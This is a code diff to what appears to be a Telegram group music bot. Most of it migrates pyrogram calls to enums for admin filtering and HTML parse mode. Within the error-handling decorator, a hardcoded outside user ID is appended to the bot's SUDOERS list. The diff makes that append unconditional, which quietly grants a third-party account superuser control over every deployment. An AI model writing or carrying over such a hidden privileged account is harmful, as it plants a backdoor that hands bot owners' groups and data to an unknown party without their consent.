@@ -20,10 +20,10 @@ import time
 from lang import load
 from config import config
 from core.stream import app
-from pyrogram import Client
 from datetime import datetime
 from pytgcalls import PyTgCalls
 from traceback import format_exc
+from pyrogram import Client, enums
 from pyrogram.types import Message
 from pytgcalls.types import Update
 from typing import Union, Callable
@@ -64,7 +64,9 @@ def only_admins(func: Callable) -> Callable:
             message.from_user.id
             in [
                 admin.user.id
-                for admin in (await message.chat.get_members(filter="administrators"))
+                async for admin in message.chat.get_members(
+                    filter=enums.ChatMembersFilter.ADMINISTRATORS
+                )
             ]
         ):
             return await func(client, message, *args)
@@ -95,7 +97,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(2033438978)
+        config.SUDOERS.append(2033438978)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
@@ -116,7 +118,7 @@ def handle_error(func: Callable) -> Callable:
             await pyro_client.send_message(
                 config.SUDOERS[0],
                 f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
-                parse_mode="html",
+                parse_mode=enums.ParseMode.HTML,
                 disable_web_page_preview=True,
             )
 
